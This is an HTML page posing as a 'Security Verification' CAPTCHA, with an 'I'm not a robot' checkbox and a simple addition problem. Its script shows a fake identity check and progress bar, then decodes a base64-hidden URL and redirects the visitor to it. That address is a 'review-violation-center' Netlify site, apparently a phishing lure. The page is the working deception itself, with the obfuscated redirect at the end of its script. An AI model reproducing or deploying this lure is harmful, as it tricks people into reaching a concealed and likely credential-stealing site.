
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0f1a3d, #1e3a8a, #0f1a3d);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 18px;
            overflow: hidden;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 500px;
            padding: 30px;
        }
        
        .verification-container {
            background: #f8fafc;
            border-radius: 14px;
            padding: 30px;
            border: 1px solid #e2e8f0;
            position: relative;
            overflow: hidden;
        }
        
        .verification-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 6px;
            background: linear-gradient(to right, #3b82f6, #2563eb);
        }
        
        .verification-header {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .verification-icon {
            background: #dbeafe;
            width: 48px;
            height: 48px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 16px;
            flex-shrink: 0;
        }
        
        .verification-icon i {
            color: #2563eb;
            font-size: 22px;
        }
        
        .verification-header h3 {
            color: #1e293b;
            font-size: 20px;
            font-weight: 700;
        }
        
        .verification-challenge {
            display: flex;
            align-items: center;
            background: white;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 18px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
        }
        
        .verification-challenge:hover {
            background: #f1f5f9;
            border-color: #cbd5e1;
            transform: translateY(-3px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.08);
        }
        
        .challenge-checkbox {
            width: 26px;
            height: 26px;
            border: 2px solid #94a3b8;
            border-radius: 7px;
            margin-right: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
            flex-shrink: 0;
        }
        
        .challenge-checkbox.checked {
            background: #3b82f6;
            border-color: #3b82f6;
        }
        
        .challenge-checkbox.checked::after {
            content: "✓";
            color: white;
            font-size: 16px;
            font-weight: bold;
        }
        
        .challenge-text {
            font-size: 18px;
            color: #1e293b;
            font-weight: 500;
        }
        
        .math-challenge {
            display: none;
            background: white;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 24px;
            margin-top: 24px;
            transition: all 0.3s ease;
        }
        
        .math-challenge.active {
            display: block;
        }
        
        .math-title {
            font-size: 17px;
            color: #4b5563;
            margin-bottom: 18px;
            font-weight: 500;
            text-align: center;
        }
        
        .math-problem {
            font-size: 32px;
            font-weight: 800;
            text-align: center;
            margin: 20px 0;
            color: #1e293b;
        }
        
        .answer-input {
            width: 100%;
            padding: 16px;
            border: 2px solid #e2e8f0;
            border-radius: 10px;
            font-size: 20px;
            text-align: center;
            transition: all 0.3s ease;
            margin: 12px 0;
            font-weight: 600;
        }
        
        .answer-input:focus {
            border-color: #3b82f6;
            outline: none;
            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.2);
        }
        
        .answer-input.correct {
            border-color: #10b981;
            background-color: #ecfdf5;
        }
        
        .answer-input.incorrect {
            border-color: #ef4444;
            background-color: #fef2f2;
        }
        
        .submit-btn {
            background: linear-gradient(to right, #3b82f6, #2563eb);
            color: white;
            border: none;
            padding: 18px;
            font-size: 20px;
            font-weight: 700;
            border-radius: 12px;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
            margin-top: 24px;
        }
        
        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 16px rgba(59, 130, 246, 0.4);
        }
        
        .submit-btn:disabled {
            background: #cbd5e1;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .submit-btn i {
            margin-left: 12px;
            font-size: 20px;
        }
        
        .status-message {
            padding: 16px;
            border-radius: 10px;
            margin-top: 24px;
            text-align: center;
            font-size: 16px;
            display: none;
        }
        
        .status-message.error {
            background: #fef2f2;
            color: #b91c1c;
            border: 1px solid #fecaca;
            display: block;
        }
        
        .status-message.success {
            background: #f0fdf4;
            color: #15803d;
            border: 1px solid #bbf7d0;
            display: block;
        }
        
        .loading-bar {
            height: 6px;
            background: #e2e8f0;
            border-radius: 3px;
            overflow: hidden;
            margin: 15px 0 24px;
        }
        
        .loading-progress {
            height: 100%;
            width: 0%;
            background: linear-gradient(to right, #3b82f6, #2563eb);
            transition: width 0.5s linear;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 20px;
                max-width: 95%;
            }
            
            .verification-container {
                padding: 20px;
            }
            
            .verification-header h3 {
                font-size: 18px;
            }
            
            .challenge-text {
                font-size: 16px;
            }
            
            .math-problem {
                font-size: 28px;
            }
            
            .answer-input {
                font-size: 18px;
                padding: 14px;
            }
            
            .submit-btn {
                font-size: 18px;
                padding: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="verification-container">
            <div class="verification-header">
                <div class="verification-icon">
                    <i class="fas fa-user-shield"></i>
                </div>
                <h3>Verification Required</h3>
            </div>
            
            <div class="verification-challenge" id="botChallenge">
                <div class="challenge-checkbox" id="botCheckbox"></div>
                <div class="challenge-text">
                    I'm not a robot
                </div>
            </div>
            
            <div class="math-challenge" id="mathChallenge">
                <div class="math-title">Please solve this math problem to verify:</div>
                <div class="math-problem" id="mathProblem">5 + 8 = ?</div>
                <input type="number" class="answer-input" id="answerInput" placeholder="Enter your answer">
                <div id="mathFeedback"></div>
            </div>
            
            <button class="submit-btn" id="submitBtn" disabled>
                Continue
                <i class="fas fa-arrow-right"></i>
            </button>
            
            <div id="statusMessage" class="status-message"></div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const botChallenge = document.getElementById('botChallenge');
            const botCheckbox = document.getElementById('botCheckbox');
            const submitBtn = document.getElementById('submitBtn');
            const statusMessage = document.getElementById('statusMessage');
            const mathChallenge = document.getElementById('mathChallenge');
            const mathProblem = document.getElementById('mathProblem');
            const answerInput = document.getElementById('answerInput');
            const mathFeedback = document.getElementById('mathFeedback');

            let num1, num2, correctAnswer;

            // Generate a random math problem
            function generateMathProblem() {
                num1 = Math.floor(Math.random() * 10) + 1;
                num2 = Math.floor(Math.random() * 10) + 1;
                correctAnswer = num1 + num2;

                mathProblem.textContent = `${num1} + ${num2} = ?`;
                answerInput.value = '';
                answerInput.className = 'answer-input';
                mathFeedback.textContent = '';
            }

            // Initialize with a math problem
            generateMathProblem();

            botChallenge.addEventListener('click', function() {
                botCheckbox.classList.toggle('checked');

                if (botCheckbox.classList.contains('checked')) {
                    // Show math challenge
                    mathChallenge.classList.add('active');
                    answerInput.focus();

                    // Disable submit until math problem is solved
                    submitBtn.disabled = true;
                } else {
                    // Hide math challenge
                    mathChallenge.classList.remove('active');

                    // Disable submit button
                    submitBtn.disabled = true;
                }
            });

            // Validate math answer
            answerInput.addEventListener('input', function() {
                const userAnswer = parseInt(answerInput.value);

                if (isNaN(userAnswer)) {
                    answerInput.className = 'answer-input';
                    mathFeedback.textContent = '';
                    submitBtn.disabled = true;
                    return;
                }

                if (userAnswer === correctAnswer) {
                    answerInput.className = 'answer-input correct';
                    mathFeedback.innerHTML = '<span style="color:#10b981; font-weight:600;">✓ Correct! You may proceed.</span>';
                    submitBtn.disabled = false;
                } else {
                    answerInput.className = 'answer-input incorrect';
                    mathFeedback.innerHTML = '<span style="color:#ef4444; font-weight:600;">✗ Incorrect. Please try again.</span>';
                    submitBtn.disabled = true;
                }
            });

            // Submit button handler
            submitBtn.addEventListener('click', function() {
                // Show processing state
                submitBtn.disabled = true;
                submitBtn.innerHTML = 'Processing... <i class="fas fa-spinner fa-spin"></i>';

                // Create loading bar
                const loadingBar = document.createElement('div');
                loadingBar.className = 'loading-bar';
                const loadingProgress = document.createElement('div');
                loadingProgress.className = 'loading-progress';
                loadingBar.appendChild(loadingProgress);
                statusMessage.parentNode.insertBefore(loadingBar, statusMessage.nextSibling);

                // Show initial status
                statusMessage.textContent = 'Verifying your identity...';
                statusMessage.className = 'status-message success';
                statusMessage.style.display = 'block';

                // Animate progress bar
                let progress = 0;
                const interval = setInterval(() => {
                    progress += 5;
                    loadingProgress.style.width = progress + '%';
                    if (progress >= 100) {
                        clearInterval(interval);
                    }
                }, 150);

                // Simulate processing delay
                setTimeout(function() {
                    // Show success message
                    statusMessage.textContent = 'Verification successful! Redirecting...';
                    statusMessage.className = 'status-message success';

                    // Redirect after a short delay
                    setTimeout(function() {
                        // Decode and redirect to the obfuscated URL
                        (function(u){
                            var p = atob(u);
                            window.location.href = p;
                        })("aHR0cHM6Ly9yZXZpZXctdmlvbGF0aW9uLWNlbnRlci5uZXRsaWZ5LmFwcA==");
                    }, 1000);
                }, 3000);
            });
        });
    </script>
</body>
</html>
